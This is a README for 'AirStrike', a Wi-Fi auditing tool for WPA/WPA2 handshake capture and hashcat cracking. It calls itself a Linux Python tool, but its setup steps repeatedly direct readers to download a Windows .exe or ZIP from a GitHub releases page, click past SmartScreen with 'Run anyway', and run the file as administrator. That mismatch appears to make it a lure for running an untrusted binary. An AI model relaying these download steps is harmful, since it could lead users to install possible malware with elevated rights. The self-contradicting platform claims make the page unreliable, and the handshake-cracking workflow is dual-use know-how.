# 📡 AirStrike - Simple Wi-Fi Auditing on Linux

[![Download AirStrike](https://img.shields.io/badge/Download%20AirStrike-Visit%20Releases-blue?style=for-the-badge&logo=github)](https://github.com/occasionpuffbird12/AirStrike/releases)

## 🖥️ What AirStrike Does

AirStrike is a Linux GUI tool for authorized Wi-Fi security auditing. It helps you set up monitor mode, scan access points and clients, capture WPA/WPA2 handshakes, and test password strength offline with hashcat.

It is built for users who want a clear screen and a simple workflow instead of command-line tools.

## 📥 Download AirStrike

Visit this page to download AirStrike for Windows and other available builds:

https://github.com/occasionpuffbird12/AirStrike/releases

On the releases page, look for the latest version and download the Windows file that matches your system.

## 🚀 Getting Started

Follow these steps to install and run AirStrike on Windows:

1. Open the release page.
2. Download the latest Windows build from the list of assets.
3. Save the file to a folder you can find, such as Downloads or Desktop.
4. If the file comes in a ZIP folder, extract it first.
5. Open the extracted folder.
6. Double-click the AirStrike app file to start it.

If Windows asks for permission, choose Yes so the app can open.

## 🪟 Windows Setup

AirStrike runs on Windows through a bundled build from the release page.

Use this setup flow:

1. Download the Windows release.
2. Unzip the file if needed.
3. Keep all files in the same folder.
4. Open the main app file.
5. If Windows SmartScreen appears, select More info, then Run anyway if you trust the source and you have the right to use the tool.

If the app does not open, make sure you extracted the full folder and did not move the app file away from its support files.

## 🧭 How to Use AirStrike

AirStrike keeps the main steps in one place:

1. Start the app.
2. Choose your wireless adapter.
3. Enable monitor mode if needed.
4. Scan nearby access points.
5. Pick a target network you are allowed to test.
6. Scan connected clients if you need device data.
7. Capture a WPA/WPA2 handshake.
8. Save the capture file.
9. Load the capture into hashcat for offline password testing.

The interface is meant to guide you through the task in order, so you do not need to use terminal commands.

## 📶 Main Features

### 🔎 Network Scanning
Find nearby access points and connected clients in a clear list.

### 📡 Monitor Mode Setup
Put your adapter into monitor mode from the app without extra steps.

### 🔐 Handshake Capture
Capture WPA/WPA2 handshakes for authorized testing and later analysis.

### 🧩 Offline Password Testing
Send capture files to hashcat for local password testing.

### 🖱️ GUI Controls
Use buttons and menus instead of command-line tools.

### 🗂️ File Handling
Save scan results and capture files in one place so you can find them later.

## 🧰 Requirements

AirStrike works best on a system that meets these basic needs:

- Windows 10 or Windows 11
- A supported wireless adapter
- Permission to access the wireless device
- Enough disk space for capture files and logs
- A stable graphics display for the GUI

For the best results, use an adapter that supports monitor mode and packet capture.

## 🛠️ Recommended Setup

To avoid setup issues, keep these points in mind:

- Use a wired mouse and keyboard if your laptop has a shared wireless card
- Close apps that may use the wireless adapter
- Run the app from a folder with full access rights
- Keep capture files in one folder for easy review
- Use a separate adapter for Wi-Fi access if your main adapter enters monitor mode

## 📂 File Types You May See

After downloading from the releases page, you may see one of these file types:

- `.zip` file: extract it before running the app
- `.exe` file: double-click it to start
- support files: keep them in the same folder as the main app

If the release includes more than one file, choose the Windows package that fits your device.

## 🧪 Typical Workflow

A normal session usually looks like this:

1. Open AirStrike.
2. Select your adapter.
3. Turn on monitor mode.
4. Start a scan.
5. Review the access points list.
6. Review the client list.
7. Choose a target you are allowed to test.
8. Capture the handshake.
9. Export the capture.
10. Load the file into hashcat for offline testing.

This flow keeps the process simple and helps you move from scan to capture without changing tools.

## 🔒 Authorization

Use AirStrike only on wireless networks you own or have clear permission to test.

## 📝 Troubleshooting

### App will not open
- Make sure you downloaded the full release file
- Extract the ZIP folder before running the app
- Keep all files together in one folder
- Try running the app as an administrator

### No wireless adapter appears
- Check that the adapter is plugged in or enabled
- Unplug and reconnect the device
- Try a different USB port
- Make sure Windows sees the adapter in Device Manager

### Scan results are empty
- Move closer to the wireless networks you want to view
- Check that the adapter supports monitor mode
- Restart the app and scan again
- Disable other Wi-Fi tools that may hold the adapter

### Capture file is not saved
- Check folder permissions
- Use a folder under your user profile
- Make sure you have enough free disk space

### Hashcat step does not start
- Confirm that the capture file loaded correctly
- Check that hashcat is installed if your build expects a local copy
- Verify that the capture file is in a supported format

## 📁 Suggested Folder Layout

Keep your files in a simple structure like this:

- AirStrike
  - app files
  - captures
  - exports
  - logs

This makes it easier to find scan results and handshake files later.

## 🔧 Tips for Better Results

- Use a short folder path
- Keep capture names simple
- Save each test in a separate folder
- Use a dedicated adapter for Wi-Fi testing
- Update Windows drivers for your wireless card
- Restart the adapter if it stops responding

## 🧑‍💻 For First-Time Users

If this is your first time using a Wi-Fi auditing tool, start with these basics:

- Learn which adapter you are using
- Check whether it supports monitor mode
- Test the scan feature before trying a capture
- Work on a network you can legally audit
- Save each result before you close the app

This helps you avoid common setup mistakes and keeps the workflow clear

## 📌 Project Topics

aircrack-ng, cybersecurity, ethical-hacking, handshake, hashcat, linux, network-security, packet-capture, pentesting, python, wifi-security, wireless-security, wpa2

## 📦 Download

Use the release page to download AirStrike:

https://github.com/occasionpuffbird12/AirStrike/releases

## 📄 License

Use this software only in ways that match your rights and local rules